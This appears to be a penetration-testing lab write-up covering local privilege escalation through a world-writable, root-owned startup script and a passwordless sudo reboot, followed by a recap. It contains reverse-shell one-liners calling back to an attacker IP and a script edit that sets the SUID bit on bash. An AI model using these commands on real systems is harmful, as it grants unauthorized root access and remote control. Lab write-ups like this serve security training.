#### LPE
![Pasted image 20260524165708.png](../assets/labs-img/Pasted%20image%2020260524165708.png)

The sudo policy allowed a passwordless reboot.
I looked for root-owned startup files that the unprivileged account could modify.
```bash
find / -user root -writable  2>/dev/null
```
The search identified a writable system-checking program under /usr/bin.
![Pasted image 20260524172233.png](../assets/labs-img/Pasted%20image%2020260524172233.png)
The first callback tests failed. A later test confirmed that the writable startup component executed with enough privilege to change permissions on a system binary.
```bash
# Initial connectivity test
/bin/bash -i >& /dev/tcp/192.168.45.189/4444 0>&1

# Alternate connectivity test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.189 4444 >/tmp/f

# Assess privileged file mode changes
chmod +s /usr/bin/bash

# Identify root-owned files writable by the current account
find / -user root -writable -type f  2>/dev/null

# Review the current file permissions
ls -lsa /usr/bin/check-system
# 4 -rw----rw- 1 root root 157 May 24 05:16 /usr/bin/check-system

# Original system-checking program
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done

# Modified system-checking program
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info
chmod +s /usr/bin/bash
while :
do
echo "Checking...";
sleep 1;
done

# Restart to verify startup behavior
sudo shutdown -r now
```

#### Recap
The initial directory lists did not contain the MantisBT path. A broader directory corpus located it.

I revisited the web root and found Adminer. The disclosed database credential was useful there even though the database port was not exposed.

Passwordless reboot made writable startup files a relevant privilege boundary. The initial callback was unreliable, but a file mode change confirmed privileged execution.

Summary: Use a directory list that covers application-specific candidates. File extensions only expand coverage when the scanner is configured to try them.
